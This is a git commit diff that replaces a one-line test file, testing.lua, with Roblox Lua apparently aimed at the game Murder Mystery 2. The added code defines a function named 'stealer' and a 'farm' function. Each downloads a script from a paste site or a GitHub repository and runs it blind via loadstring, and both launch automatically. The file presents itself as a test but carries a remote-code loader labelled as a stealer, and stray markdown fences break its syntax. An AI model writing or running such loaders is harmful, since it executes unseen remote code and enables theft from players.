2198aed187c74ebf01d28824a88b1659268a7f88
baldiblanco61-beep <baldiblanco61@gmail.com>
2026-05-17 14:13:10 +0800

    Mm2.lua

--- testing.lua
+++ testing.lua
@@ -1,1 +1,11 @@
-print("Hi")
+
+
+```local function stealer()
+    loadstring(game:HttpGet('https://cdn.sourceb.in/bins/rtWk3Difqm/0'))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Keyless-Script-Free/VisionHub-MM2/refs/heads/main/OverdriveH'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)```
